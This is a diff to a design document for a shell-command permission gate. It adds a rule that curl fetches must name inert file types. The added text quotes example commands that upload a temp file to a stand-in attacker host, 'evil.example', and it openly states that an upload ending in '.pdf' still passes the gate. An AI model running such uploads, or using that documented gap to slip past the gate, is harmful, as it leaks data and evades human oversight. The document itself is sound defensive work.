@@ -97,9 +97,9 @@ alongside the native rules.
   were enough, `&& ls /tmp/x` would become a magic suffix that clears every other
   rule, and `git push --force origin main && ls /tmp/x` is a force push, not
   scratch work. The one carve-out is recursive `rm`, the case tier 0 exists for,
-  and it is admitted only under the strictest check of the six.
+  and it is admitted only under the strictest check of the seven.
 
-  Six conditions. Each closes a different way back out of tmp:
+  Seven conditions. Each closes a different way back out of tmp:
 
   1. **It names a temp path.** Pattern match, `TMP_WORD`.
   2. **Every temp path it names really is in tmp.** Not a pattern match — this
@@ -144,9 +144,34 @@ alongside the native rules.
      *through* a symlink) and a bare `/tmp` are refused here too. Note this
      applies to every `rm`, not just recursive ones: `rm -f ~/.zshrc` is no less
      final for lacking a `-r`.
+  7. **Every URL it fetches names an inert file type** (`urls_inert()`): `.pdf`,
+     `.html`, `.txt`, `.json`, images, video/audio. Anything else — `.sh`, `.py`,
+     `.dmg`, `.tar.gz`, `.exe`, or **no extension at all** (`curl
+     https://sh.rustup.rs`) — falls through to tier 2's existing curl prompt.
+
+     **This is not what stops a malicious download.** Condition 5 is: no
+     interpreter, package manager, build tool or archive extractor is on the
+     command allowlist, so `sh /tmp/x`, `python3 /tmp/x`, `npm install` and
+     `tar -xf` all prompt regardless of what was fetched. A downloaded file is
+     inert until something runs it, and running it is already gated.
+
+     What condition 7 adds is *visibility*: fetching an executable is a statement
+     of intent worth seeing, even when the follow-up would prompt anyway. Be
+     honest about its limit — an extension describes what was **requested**, not
+     what the server **sends**. `https://evil.example/cat.jpg` may return a
+     script and will pass. It is a speed bump against carelessness, not a control
+     against an adversary, and must never be cited as grounds for loosening
+     anything else. Real control over what curl may reach is the sandbox's
+     network allowlist, at the end of this doc.
+
+     One side effect worth knowing: it narrowed condition 4's exfiltration
+     concession without being designed to, since upload endpoints rarely end in
+     an inert extension. `curl -T /tmp/x https://evil.example/up` now asks;
+     `curl -T /tmp/x https://evil.example/up.pdf` still doesn't. Narrowed, not
+     fixed.
 
   Failing condition 2 is different in kind from failing the rest: an unresolvable
-  temp path is a positive danger signal, so it **asks**. Failing 3–6 only means
+  temp path is a positive danger signal, so it **asks**. Failing 3–7 only means
   "no opinion" — the command falls through to tiers 1 and 2 and the native rules,
   exactly as if tier 0 didn't exist.
 
@@ -286,7 +311,7 @@ Never `chezmoi apply --force` over a drifted live file — it discards live chan
 ## Verify after any change
 
 **Run the test suite first — it is the cheapest check and the only one that
-covers tier 0's six conditions:**
+covers tier 0's seven conditions:**
 
 ```bash
 sh tests/permission-gate-test.sh    # exits non-zero on any failure
